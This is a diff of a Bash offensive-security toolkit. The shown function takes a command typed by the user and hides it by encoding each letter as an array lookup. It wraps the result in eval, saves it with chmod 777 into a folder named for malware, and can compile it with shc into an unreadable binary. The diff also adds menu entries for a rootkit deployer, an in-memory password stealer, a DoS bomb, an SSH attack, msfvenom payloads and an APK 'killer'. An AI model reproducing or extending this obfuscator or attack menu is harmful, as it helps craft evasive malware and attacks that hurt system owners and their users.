-    elif [[ "$char" =~ [a-z] ]]; then
-        index=$(printf "%d" "'$char")
-        index=$((index - 97))
-        result+="\${LF[$index]}"
-    else
-        # Preserve spaces, dots, etc. directly
-        result+="$char"
-    fi
-done
+    A="$ae Array Encrypt Script ==> ${x}"
+    clear
+    etc_array_frame
+    # Define uppercase and lowercase arrays
+    UF=( A B C D E F G H I J K L M N O P Q R S T U V W X Y Z )
+    LF=( a b c d e f g h i j k l m n o p q r s t u v w x y z )
+    # read command to convert
+    echo -ne "\e[36mEnter a command to convert:\e[0m "
+    read -r -p "${c} ${A} ${x}" command
+    # ask user for final script name
+    echo -ne "\e[36mEnter a final script name:\e[0m "
+    read -r -p "${c} ${A} ${x}" name
+    # convert each letter of $command to a array index
+    result=""
+    for (( i=0; i<${#command}; i++ )); do
+        char="${command:$i:1}"
+        # Convert to array index
+        if [[ "$char" =~ [A-Z] ]]; then
+            index=$(printf "%d" "'$char")
+            index=$((index - 65))
+            result+="\${UF[$index]}"
+        elif [[ "$char" =~ [a-z] ]]; then
+            index=$(printf "%d" "'$char")
+            index=$((index - 97))
+            result+="\${LF[$index]}"
+        else
+            # Preserve spaces, dots, etc. directly
+            result+="$char"
+        fi
+    done
 
-echo -e "\n\e[35m ${A} Converted:\e[0m"
-# create the script.sh with the arrays
-cat << 'EOF' > script.sh
-#!/bin/bash
+    echo -e "\n\e[35m ${A} Converted:\e[0m"
+    # create the script.sh with the arrays
+    cat << 'EOF' > script.sh
+    #!/bin/bash
 
-UF=( A B C D E F G H I J K L M N O P Q R S T U V W X Y Z )
-LF=( a b c d e f g h i j k l m n o p q r s t u v w x y z )
+    UF=( A B C D E F G H I J K L M N O P Q R S T U V W X Y Z )
+    LF=( a b c d e f g h i j k l m n o p q r s t u v w x y z )
 
-eval "XXXXX"
+    eval "XXXXX"
 EOF
-# cat the script.sh into a variable and replace eval "XXXXX" with eval "command" in array form
-template=$(cat script.sh | awk -v x="$result" '{gsub(/XXXXX/, x); print}')
-# echo the array correct script
-echo "$template" > script2.sh
-rm -f script.sh
-mv script2.sh "$Malware/script.sh"
-chmod 777 "$Malware/script.sh"
-echo -e "\n\e[34mDo you want to create a unreadable binary script ? y/n\e[0m"
-read -r -p "${p} y=yes n=no ${c} ${A} ${x}" ans
-[[ "$ans" =~ [Yy] ]] && shc -r -f "$Malware/script.sh" -o "$Malware/$name" && \
- rm -f "$Malware/script.sh" "$Malware/script.sh.x.c" || \
- mv "$Malware/script.sh" "$Malware/$name" && rm -f "$Malware/script.sh";
-echo -e "\n\e[35mScript is located at: $Malware/$name\e[0m"
-wait_and_return
+    # cat the script.sh into a variable and replace eval "XXXXX" with eval "command" in array form
+    template=$(cat script.sh | awk -v x="$result" '{gsub(/XXXXX/, x); print}')
+    # echo the array correct script
+    echo "$template" > script2.sh
+    rm -f script.sh
+    mv script2.sh "$Malware/script.sh"
+    chmod 777 "$Malware/script.sh"
+    echo -e "\n\e[34mDo you want to create a unreadable binary script ? y/n\e[0m"
+    read -r -p "${p} y=yes n=no ${c} ${A} ${x}" ans
+    [[ "$ans" =~ [Yy] ]] && shc -r -f "$Malware/script.sh" -o "$Malware/$name" && \
+     rm -f "$Malware/script.sh" "$Malware/script.sh.x.c" || \
+     mv "$Malware/script.sh" "$Malware/$name" && rm -f "$Malware/script.sh";
+    echo -e "\n\e[35mScript is located at: $Malware/$name\e[0m"
+    wait_and_return
 }
 ######################## MAIN SCRIPT #######################
 check_root
-
+# Check for any arguements and display the correct information
+# Script needs 2 arguements to run
+# If no arguemets then start in GUI mode
 if [[ $# -eq 0 ]]; then
-        logo_animated
-        main_menu
+    header
+    main_menu
 elif [[ $# -eq 1 ]]; then
+# If only 1 arguement supplied then user may be asking for help
 	case $1 in
 		-h| -H| --help) open_help_file ;;
 		-c| -C| --class) open_class_help ;;
@@ -2214,6 +2034,7 @@ elif [[ $# -eq 1 ]]; then
 		*) show_help && exit 18 ;;
 	 esac
 elif [[ $# -ge 3 ]]; then
+# If user has 3 + arguemets they need the help menu 
 	show_help
 	exit 18
 fi
@@ -2236,6 +2057,7 @@ case $class in
         	    breached_email|breached-email|breached) breach_parse_wrapper ;;
         	    gd|google-dorks|google_dorks) google_dorks ;;
         	    email|email_search|email-search) email_search ;;
+        	    pa|pass-atk|pass_atk|password_attack|password-attack) pass_attack ;;
         	    *) echo -e "Unknown OSINT program: $2"; show_help; exit 18 ;;
         	esac
         	;;
@@ -2249,7 +2071,8 @@ case $class in
 		    	kill|kill-computer|kill_computer) destroy_computer ;;
 		    	dos|denial_of_service|denial-of-service) dos_bomb_attack ;;
 		    	ssh|ssh_attack|ssh-attack) ssh_attack ;;
-		    	msf|venom|metasplloit) msf_payloads ;;
+		    	msf|venom|metasploit) msf_payloads ;;
+		    	apk|apk_builder|apk-builder) apk_killer ;;
         	    *) echo -e "Unknown Payload program: $2"; show_help; exit 18 ;;
         	esac
         	;;
@@ -2264,6 +2087,7 @@ case $class in
         	    brute_force|brute-force|bruteforce) brute_force_file ;;
         	    files_of_interest|files-of-interest|foi) files_of_interest ;;
 				drk|deploy-rootkit|deploy_rootkit) deploy_rootkit ;;
+				mem|inmem|in-memory|in_memory) inmem_password_stealer ;; 
         	    *) echo -e "Unknown Post Exploitation program: $2"; show_help; exit 18 ;;
         	esac
         	;;
